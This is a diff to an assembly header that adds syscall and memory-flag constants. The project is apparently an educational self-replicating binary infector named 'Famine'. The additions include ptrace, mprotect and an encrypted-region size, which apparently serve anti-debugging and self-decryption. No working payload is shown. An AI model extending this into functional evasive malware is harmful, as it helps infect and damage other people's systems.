@@ -7,6 +7,14 @@
 %define SYS_getdents64	217
 %define SYS_exit		60
 %define SYS_fork        57
+%define SYS_fstat       80
+%define SYS_mmap        9
+%define PROT_READ       1
+%define MAP_SHARED      1
+%define SYS_ptrace      26
+%define DT_DIR          4
+%define PROT_WRITE      2
+
 %define O_RDONLY		0
 %define SYS_setsid      112
 %define SYS_openat		257
@@ -27,6 +35,13 @@
 %define SYS_execve	59
 %define FAMINE_SIZE end_addr - _start
 %define FAMINE_SIZE_NO_BSS buffer_bss - _start
+
+%define ENCRYPTED_SIZE end_addr - _encrypted_start
+
+%define PROT_READ    1
+%define PROT_WRITE   2
+%define PROT_EXEC    4
+%define SYS_mprotect 10
 
 ; STRUCTURES
 ; https://gist.github.com/x0nu11byt3/bcb35c3de461e5fb66173071a2379779
